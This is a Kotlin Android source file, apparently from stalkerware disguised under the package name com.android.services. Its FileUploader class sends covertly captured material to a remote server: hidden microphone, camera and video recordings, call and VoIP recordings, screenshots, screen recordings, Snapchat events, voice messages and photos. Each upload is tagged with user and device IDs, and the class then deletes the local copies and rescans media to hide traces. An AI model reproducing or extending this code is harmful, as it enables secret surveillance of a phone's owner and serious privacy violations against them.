package com.android.services.retrofit

import android.content.Context
import android.media.MediaScannerConnection
import android.text.TextUtils
import com.android.services.enums.FcmPushStatus
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.models.FileUploadResponse
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.ServerAuthUtil
import com.android.services.util.logVerbose
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import retrofit2.Call
import java.io.File
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class FileUploader constructor(private val context: Context) {

    var type: String = ""
    var localDatabaseSource: LocalDatabaseSource? = null

    constructor(context: Context, type: Int) : this(context)

    constructor(context: Context, type: String, localDatabaseSource: LocalDatabaseSource) : this(
        context
    ) {
        this.type = type
        this.localDatabaseSource = localDatabaseSource
    }

    @Throws(Exception::class)
    fun uploadFile(fileObject: JSONObject) {
        val serverToken = ServerAuthUtil.getServerToken()
        if (TextUtils.isEmpty(serverToken))
            return
        AppUtils.appendLog(
            context,
            "Initiating request for file = ${fileObject.getString("file").substringAfterLast("/")}"
        )
        val filePath = fileObject.getString("file")
        val file = File(filePath)
        if (file.exists() && !AppUtils.validFileSize(file)) {
            onFileCorrupted(filePath, fileObject)
            return
        }

        val body = file.asRequestBody("*/*".toMediaTypeOrNull())
        var apiCall: Call<FileUploadResponse>? = null
        when (type) {
            AppConstants.MIC_BUG_TYPE -> apiCall = FileUploaderAPI.tosApiClient.uploadMicBug(
                MultipartBody.Part.createFormData("file", filePath.substringAfterLast("/"), body),
                fileObject.getString("name")
                    .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                fileObject.getString("duration")
                    .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                fileObject.getString("startDatetime")
                    .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                fileObject.getString("pushId")
                    .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                fileObject.getString("pushStatus")
                    .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                AppUtils.getUserId().toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                AppUtils.getPhoneServiceId()
                    .toRequestBody("multipart/form-data".toMediaTypeOrNull())
            )
            AppConstants.VOICE_MESSAGE_TYPE -> {
                apiCall = FileUploaderAPI.tosApiClient.uploadVoiceMessage(
                    MultipartBody.Part.createFormData(
                        "file",
                        filePath.substringAfterLast("/"),
                        body
                    ),
                    fileObject.getString("appName")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    fileObject.getString("fileName")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    fileObject.getString("dateTaken")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    AppUtils.getUserId().toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    AppUtils.getPhoneServiceId()
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull())
                )
            }
            AppConstants.PHOTOS_TYPE -> {
                apiCall = FileUploaderAPI.tosApiClient.uploadPhoto(
                    MultipartBody.Part.createFormData(
                        "file",
                        filePath.substringAfterLast("/"),
                        body
                    ),
                    fileObject.getString("photoId")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    fileObject.getString("name")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    fileObject.getString("type")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    fileObject.getString("dateTaken")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    AppUtils.getUserId().toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    AppUtils.getPhoneServiceId()
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull())
                )
            }
            AppConstants.SNAP_CHAT_EVENTS_TYPE -> {
                apiCall = FileUploaderAPI.tosApiClient.uploadSnapChatEvents(
                    MultipartBody.Part.createFormData(
                        "file",
                        filePath.substringAfterLast("/"),
                        body
                    ),
                    fileObject.getString("name")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    fileObject.getString("dateTaken")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    fileObject.getString("type")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    AppUtils.getUserId().toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    AppUtils.getPhoneServiceId()
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull())
                )
            }
            AppConstants.CALL_RECORD_TYPE -> {
                apiCall = FileUploaderAPI.tosApiClient.uploadCallRecording(
                    MultipartBody.Part.createFormData(
                        "file",
                        filePath.substringAfterLast("/"),
                        body
                    ),
                    fileObject.getString("callerName")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    fileObject.getString("callName")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    fileObject.getString("callDuration")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    fileObject.getString("callStartTime")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    fileObject.getString("callDirection")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    fileObject.getString("callNumber")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    AppUtils.getUserId().toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    AppUtils.getPhoneServiceId()
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull())
                )
            }
            AppConstants.CAMERA_BUG_TYPE -> {
                apiCall = FileUploaderAPI.tosApiClient.uploadCameraBug(
                    MultipartBody.Part.createFormData(
                        "file",
                        filePath.substringAfterLast("/"),
                        body
                    ),
                    fileObject.getString("name")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    fileObject.getString("startDatetime")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    fileObject.getString("cameraType")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    fileObject.getString("pushId")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    fileObject.getString("pushStatus")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    AppUtils.getUserId().toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    AppUtils.getPhoneServiceId()
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull())
                )
            }
            AppConstants.VIDEO_BUG_TYPE -> {
                apiCall = FileUploaderAPI.tosApiClient.uploadVideoBug(
                    MultipartBody.Part.createFormData(
                        "file",
                        filePath.substringAfterLast("/"),
                        body
                    ),
                    fileObject.getString("name")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    fileObject.getString("startDatetime")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    fileObject.getString("cameraType")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    fileObject.getString("pushId")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    fileObject.getString("pushStatus")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    AppUtils.getUserId()
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    AppUtils.getPhoneServiceId()
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull())
                )
            }
            AppConstants.SCREEN_SHOT_TYPE -> {
                apiCall = FileUploaderAPI.tosApiClient.uploadScreenShot(
                    MultipartBody.Part.createFormData(
                        "file",
                        filePath.substringAfterLast("/"),
                        body
                    ),
                    fileObject.getString("name")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    fileObject.getString("dateTaken")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    fileObject.getString("pushId")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    fileObject.getString("pushStatus")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    AppUtils.getUserId().toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    AppUtils.getPhoneServiceId()
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull())
                )
            }
            AppConstants.VOIP_CALL_TYPE -> {
                apiCall = FileUploaderAPI.tosApiClient.uploadVoipCall(
                    MultipartBody.Part.createFormData(
                        "file",
                        filePath.substringAfterLast("/"),
                        body
                    ),
                    fileObject.getString("uniqueId")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    fileObject.getString("callType")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    fileObject.getString("callDirection")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    fileObject.getString("callNumber")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    fileObject.getString("callDateTime")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    fileObject.getString("name")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    fileObject.getString("appName")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    fileObject.getString("callDuration")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    AppUtils.getUserId().toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    AppUtils.getPhoneServiceId()
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull())
                )
            }
            AppConstants.SCREEN_RECORDING_TYPE -> {
                apiCall = FileUploaderAPI.tosApiClient.uploadScreenRecordings(
                    MultipartBody.Part.createFormData(
                        "file",
                        filePath.substringAfterLast("/"),
                        body
                    ),
                    fileObject.getString("name")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    fileObject.getString("startDatetime")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    fileObject.getString("appName")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    fileObject.getString("appPackageName")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    fileObject.getString("pushId")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    fileObject.getString("pushStatus")
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    AppUtils.getUserId().toRequestBody("multipart/form-data".toMediaTypeOrNull()),
                    AppUtils.getPhoneServiceId()
                        .toRequestBody("multipart/form-data".toMediaTypeOrNull())
                )
            }
        }

        val response = apiCall?.execute()!!
        if (!response.isSuccessful) {
            logVerbose("File upload Response Failed for $type = ${response.toString()}")
            AppUtils.appendLog(
                context,
                "File upload Response Failed for $type = $response"
            )
        } else if (response.isSuccessful) {
            AppUtils.appendLog(
                context,
                "File upload Response Success for $type = ${
                    response.body().toString()
                } name = ${fileObject.getString("file").substringAfterLast("/")}"
            )
//            logVerbose("File upload Response Success for $mType = ${response.body()} name = ${fileObject.getString("file").substringAfterLast("/")} date = ${fileObject.getString("dateTaken")}")
            response.body()?.let {
                onResponse(it, fileObject)
            }
        }
    }

    private fun onFileCorrupted(filePath: String, fileObject: JSONObject) {
        val executor: ExecutorService = Executors.newSingleThreadExecutor()
        executor.execute {
            updateDatabase(filePath, fileObject,FcmPushStatus.FILE_CORRUPTED.getStatus())
            deleteFile(filePath)
        }
    }

    private fun onResponse(fileUploadResponse: FileUploadResponse, fileObject: JSONObject) {
        try {
            val filePath = fileObject.getString("file")
            if (fileUploadResponse.statusCode == "200" || fileUploadResponse.statusCode == "409") {
                val executor: ExecutorService = Executors.newSingleThreadExecutor()
                executor.execute {
                    updateDatabase(filePath, fileObject,FcmPushStatus.SUCCESS.getStatus())
                    deleteFile(filePath)
                }
            } else if (fileUploadResponse.statusCode == "401"
                 || fileUploadResponse.statusCode == "402"
            ) {
                ServerAuthUtil.onTokenExpired()
            }else if(fileUploadResponse.statusCode == "405" || fileUploadResponse.statusCode == "400" ){
                ServerAuthUtil.onFcmTokenExpired()
                ServerAuthUtil.onTokenExpired()
            }
        } catch (exp: Exception) {
            logVerbose("File upload Exception for $type= ${exp.message}")
        }
    }

    private fun updateDatabase(filePath: String, fileObject: JSONObject, status: String) {
        val pushStatus= if(status=="2") 1 else 0
        when (type) {
            AppConstants.MIC_BUG_TYPE -> {
                localDatabaseSource!!.updateMicBug(filePath)
                localDatabaseSource!!.updatePushStatus(fileObject.getString("pushId"), status, pushStatus)
            }
            AppConstants.VIDEO_BUG_TYPE -> {
                localDatabaseSource!!.updateVideoBug(filePath)
                localDatabaseSource!!.updatePushStatus(fileObject.getString("pushId"), status, pushStatus)
            }
            AppConstants.PHOTOS_TYPE -> {
                val id: String = fileObject.getString("photoId")
                localDatabaseSource!!.updatePhoto(id)
            }
            AppConstants.CAMERA_BUG_TYPE -> {
                localDatabaseSource!!.updateCameraBug(filePath)
                localDatabaseSource!!.updatePushStatus(fileObject.getString("pushId"), status, pushStatus)
            }
            AppConstants.SCREEN_SHOT_TYPE -> {
                localDatabaseSource!!.updateScreenShot(filePath)
                localDatabaseSource!!.updatePushStatus(fileObject.getString("pushId"), status, pushStatus)
            }
            AppConstants.SNAP_CHAT_EVENTS_TYPE -> {
                localDatabaseSource!!.updateSnapChatEvent(filePath)
            }
            AppConstants.CALL_RECORD_TYPE -> {
                localDatabaseSource!!.updateCallRecording(filePath)
            }
            AppConstants.SCREEN_RECORDING_TYPE -> {
                localDatabaseSource!!.updateScreenRecording(filePath)
            }
            AppConstants.VOIP_CALL_TYPE -> {
                localDatabaseSource!!.updateVoipCall(filePath)
            }
            AppConstants.VOICE_MESSAGE_TYPE -> {
                localDatabaseSource!!.updateVoiceMessage(filePath)
            }
            else -> {

            }
        }
    }

    private fun deleteFile(filePath: String) {
        if (type != AppConstants.VOICE_MESSAGE_TYPE) {
            val file = File(filePath)
            if (file.exists()) {
                val isDeleted = file.delete()
                if (isDeleted) {
                    MediaScannerConnection.scanFile(context, arrayOf(filePath), null, null)
                }
            }
        }
    }
}